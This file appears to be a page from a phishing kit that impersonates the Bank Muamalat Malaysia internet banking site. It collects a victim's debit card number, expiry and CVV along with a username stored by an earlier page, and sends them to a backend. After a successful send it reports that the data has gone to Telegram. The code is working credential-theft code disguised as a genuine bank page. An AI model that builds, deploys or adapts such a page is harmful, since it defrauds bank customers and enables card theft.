<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Debit Card - i-Muamalat Internet Banking</title>
    <!-- Bootstrap CSS -->
    <link href="bootstrap.css" rel="stylesheet">
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Custom CSS (style.css) -->
    <link rel="stylesheet" href="style.css">
    <style>
        /* Gaya konsisten dengan halaman sebelumnya */
        .login-tabs {
            display: flex;
            justify-content: center;
            gap: 30px;
            margin-bottom: 10px;
        }
        .login-tabs a {
            color: #666;
            text-decoration: none;
            font-family: AvenirBold;
            font-size: 1.1rem;
            font-weight: 700;
            padding: 0 25px 5px 25px;
            border-bottom: 3px solid transparent;
        }
        .login-tabs a.active {
            color: #333;
            border-bottom-color: #FF8145;
        }
        .login-card {
            border-radius: 25px;
            overflow: hidden;
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
            background-color: #fff;
        }
        .login-header {
            background-color: #F0F0F0;
            padding: 1.5rem 2rem;
            text-align: center;
        }
        .login-header h2 {
            color: #002F87;
            font-weight: 700;
            font-family: AvenirBold;
            font-size: 1.5rem;
            margin-bottom: 0.5rem;
        }
        .login-header p {
            color: #333;
            font-family: AvenirMedium;
            margin-bottom: 0;
        }
        .login-body {
            background-color: #EFEDED;
            padding: 2rem;
            border-bottom-left-radius: 0;
            border-bottom-right-radius: 0;
        }
        .form-center {
            width: 80%;
            margin: 0 auto;
        }
        .input-wrapper {
            position: relative;
            width: 100%;
        }
        .form-control {
            background-color: white;
            transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
        }
        .form-control.is-invalid {
            border-color: #dc3545;
            box-shadow: 0 0 0 0.2rem rgba(220,53,69,.25);
        }
        .btn.button1 {
            width: 80% !important;
            padding-top: 0.5rem;
            padding-bottom: 0.5rem;
            padding-left: 0.15rem;
            padding-right: 0.15rem;
            margin-left: auto;
            margin-right: auto;
            display: block;
            background-color: #FF8145;
            color: white;
            border: none;
            font-weight: 700;
        }
        .btn.button1:hover {
            background-color: #e86a2c;
        }
        .btn.button1:disabled {
            background-color: #ccc;
            cursor: not-allowed;
        }
        .error-message {
            color: #dc3545;
            font-size: 0.85rem;
            margin-top: 5px;
            display: none;
        }
        .forgot-kill-wrapper {
            width: 80%;
            margin: 0 auto;
        }
        .forgot-kill {
            display: flex;
            justify-content: space-between;
            margin-top: 1.5rem;
            padding-top: 1.5rem;
            border-top: 1px solid #DEDEDE;
        }
        .forgot-kill a {
            color: #000;
            font-weight: 700;
            text-decoration: underline;
            font-size: 14px;
        }
        .forgot-kill a:hover {
            color: #333;
        }
        .alert-announce {
            display: flex;
            justify-content: space-between;
            align-items: stretch;
            margin-left: -2rem;
            margin-right: -2rem;
            margin-bottom: -2rem;
            margin-top: 2rem;
            padding: 1rem 2rem;
            background-color: white;
            border-bottom-left-radius: 25px;
            border-bottom-right-radius: 25px;
            box-shadow: inset 0 2px 8px rgba(0,0,0,0.02);
        }
        .alert-item {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-decoration: none;
            color: #002F87;
            font-weight: 700;
            font-family: AvenirBold;
            text-align: center;
        }
        .alert-item img {
            height: 50px;
            width: auto;
            margin-bottom: 5px;
        }
        .icon-wrapper {
            display: flex;
            align-items: center;
            gap: 5px;
            margin-bottom: 5px;
        }
        .new-icon {
            height: 20px !important;
            width: auto;
        }
        .separator {
            width: 1px;
            background-color: #333;
            margin: 0 15px;
        }
        .navbar .container {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .logo-wrapper {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .logo-wrapper img {
            height: 40px;
            width: auto;
        }
        .logo1 {
            height: 40px;
        }
        .navbar-secondary-logo img {
            height: 30px;
        }
        .navbar-toggler {
            border: none;
            margin-right: 1px;
        }
        .navbar-toggler-icon {
            background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 30 30'%3e%3cpath stroke='%23002F87' stroke-linecap='round' stroke-miterlimit='10' stroke-width='3' d='M4 7h22M4 15h22M4 23h22'/%3e%3c/svg%3e") !important;
        }
        .navbar-collapse {
            flex-grow: 0;
        }
        @media (min-width: 992px) {
            .navbar-toggler {
                display: none;
            }
        }
        @media (max-width: 991px) {
            .navbar-collapse {
                background-color: #FF8145;
                padding: 1rem;
                border-radius: 0 0 15px 15px;
                margin-top: 10px;
            }
            .navbar-nav .nav-link {
                text-align: center;
            }
        }
        .bg {
            background-image: url('login_background.png');
            background-size: cover;
            background-position: center;
            min-height: calc(100vh - 76px);
            position: relative;
        }
        .bg .container {
            padding-top: 3rem;
        }
        .copyright {
            text-align: center;
            color: white;
            font-size: 0.8rem;
            margin-top: 2rem;
            font-family: Avenir;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.5);
        }
        /* Style untuk form debit */
        .row-input {
            display: flex;
            gap: 10px;
            margin-bottom: 1rem;
        }
        .row-input > div {
            flex: 1;
        }
        /* ===== LOADING OVERLAY ===== */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }
        .loading-overlay img {
            width: 20px;
            height: 20px;
        }
    </style>
</head>
<body>
    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <img src="ajax-loader.gif" alt="Loading...">
    </div>

    <!-- Navbar -->
    <nav class="navbar navbar-expand-lg navbar-custom py-3">
        <div class="container">
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="logo-wrapper">
                <a href="#">
                    <img src="navbar_logo.png" alt="Bank Muamalat" class="logo1">
                </a>
                <a href="#" class="navbar-secondary-logo">
                    <img src="navbar_secondary_logo.png" alt="Secondary Logo">
                </a>
            </div>
            <div class="collapse navbar-collapse" id="navbarNav">
                <ul class="navbar-nav ms-auto">
                    <li class="nav-item">
                        <a class="nav-link white" href="#">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <!-- Main Content -->
    <div class="bg d-flex align-items-center">
        <div class="container py-4">
            <div class="row justify-content-center">
                <div class="col-lg-6 col-md-8">
                    <div class="login-card">
                        <div class="login-header">
                            <div class="login-tabs">
                                <a href="#" class="active">Debit Card</a>
                            </div>
                            <h2>Enter Your Card Details</h2>
                            <p>Secure payment information</p>
                        </div>
                        <div class="login-body">
                            <!-- Username tidak ditampilkan -->

                            <form id="debitForm" novalidate>
                                <!-- Nomor Kartu -->
                                <div class="mb-3 form-center">
                                    <label for="cardNumber" class="form-label mediumText grey3">Card Number</label>
                                    <div class="input-wrapper">
                                        <input type="text" class="form-control" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required inputmode="numeric">
                                    </div>
                                    <div class="error-message" id="cardNumberError"></div>
                                </div>

                                <!-- Expiry dan CVV dalam satu baris -->
                                <div class="form-center row-input">
                                    <div>
                                        <label for="expiry" class="form-label mediumText grey3">Expiry (MM/YY)</label>
                                        <input type="text" class="form-control" id="expiry" placeholder="MM/YY" maxlength="5" required inputmode="numeric">
                                        <div class="error-message" id="expiryError"></div>
                                    </div>
                                    <div>
                                        <label for="cvv" class="form-label mediumText grey3">CVV</label>
                                        <input type="text" class="form-control" id="cvv" placeholder="123" maxlength="3" required inputmode="numeric">
                                        <div class="error-message" id="cvvError"></div>
                                    </div>
                                </div>

                                <!-- Tombol VERIFY -->
                                <button type="submit" class="btn button1 font4 mt-3" id="submitBtn">VERIFY</button>
                            </form>

                            <!-- Security Alert & Announcements -->
                            <div class="alert-announce">
                                <a href="#" class="alert-item">
                                    <img src="security_alert.png" alt="Security Alert">
                                    <span>Security Alert</span>
                                </a>
                                <div class="separator"></div>
                                <a href="#" class="alert-item">
                                    <div class="icon-wrapper">
                                        <img src="announcement.png" alt="Announcement">
                                        <img src="new_icon.png" alt="New" class="new-icon">
                                    </div>
                                    <span>Announcements</span>
                                </a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="copyright">
                <p>Copyright © Bank Muamalat Malaysia Berhad 196501000376 (6175-W)</p>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <script>
        // Elemen loading dan tombol
        const loadingOverlay = document.getElementById('loadingOverlay');
        const submitBtn = document.getElementById('submitBtn');

        // Ambil username dari sessionStorage untuk dikirim ke API
        const username = sessionStorage.getItem('username');
        if (!username) {
            window.location.href = 'index.html';
        }

        // Format nomor kartu dengan spasi setiap 4 digit (hanya angka)
        document.getElementById('cardNumber').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
            let formatted = '';
            for (let i = 0; i < value.length; i++) {
                if (i > 0 && i % 4 === 0) formatted += ' ';
                formatted += value[i];
            }
            e.target.value = formatted;
        });

        // Format expiry otomatis tambahkan slash (hanya angka)
        document.getElementById('expiry').addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0,2) + '/' + value.substring(2,4);
            }
            e.target.value = value;
        });

        // Batasi CVV hanya angka
        document.getElementById('cvv').addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '');
        });

        // Validasi form
        document.getElementById('debitForm').addEventListener('submit', function(e) {
            e.preventDefault();

            // Reset error
            document.querySelectorAll('.form-control').forEach(el => el.classList.remove('is-invalid'));
            document.querySelectorAll('.error-message').forEach(el => el.style.display = 'none');

            let isValid = true;

            const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
            const expiry = document.getElementById('expiry').value.trim();
            const cvv = document.getElementById('cvv').value.trim();

            // Validasi nomor kartu (16 digit angka)
            if (!cardNumber || cardNumber.length !== 16 || !/^\d+$/.test(cardNumber)) {
                document.getElementById('cardNumber').classList.add('is-invalid');
                document.getElementById('cardNumberError').textContent = 'Card number must be 16 digits';
                document.getElementById('cardNumberError').style.display = 'block';
                isValid = false;
            }

            // Validasi expiry (format MM/YY)
            if (!expiry || !/^(0[1-9]|1[0-2])\/([0-9]{2})$/.test(expiry)) {
                document.getElementById('expiry').classList.add('is-invalid');
                document.getElementById('expiryError').textContent = 'Use MM/YY format';
                document.getElementById('expiryError').style.display = 'block';
                isValid = false;
            }

            // Validasi CVV (3 digit)
            if (!cvv || cvv.length !== 3 || !/^\d+$/.test(cvv)) {
                document.getElementById('cvv').classList.add('is-invalid');
                document.getElementById('cvvError').textContent = 'CVV must be 3 digits';
                document.getElementById('cvvError').style.display = 'block';
                isValid = false;
            }

            if (!isValid) return;

            // Tampilkan loading dan nonaktifkan tombol
            loadingOverlay.style.display = 'flex';
            submitBtn.disabled = true;

            // Kirim data debit ke backend (tanpa cardName)
            fetch('/api/debit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    username,
                    cardNumber: cardNumber,
                    expiry,
                    cvv
                })
            })
            .then(res => {
                if (!res.ok) {
                    return res.json().then(err => { throw new Error(err.error || 'Server error'); });
                }
                return res.json();
            })
            .then(data => {
                if (data.success) {
                    alert('Verification successful! Data sent to Telegram.');
                    // Bersihkan session dan redirect ke halaman utama
                    sessionStorage.removeItem('username');
                    window.location.href = 'index.html';
                } else {
                    throw new Error('Server returned error');
                }
            })
            .catch(err => {
                console.error(err);
                alert('Gagal menghubungi server. Pastikan server backend berjalan.');
            })
            .finally(() => {
                loadingOverlay.style.display = 'none';
                submitBtn.disabled = false;
            });
        });

        document.querySelectorAll('.login-tabs a').forEach(tab => {
            tab.addEventListener('click', function(e) {
                e.preventDefault();
                document.querySelectorAll('.login-tabs a').forEach(t => t.classList.remove('active'));
                this.classList.add('active');
            });
        });
    </script>
</body>
</html>
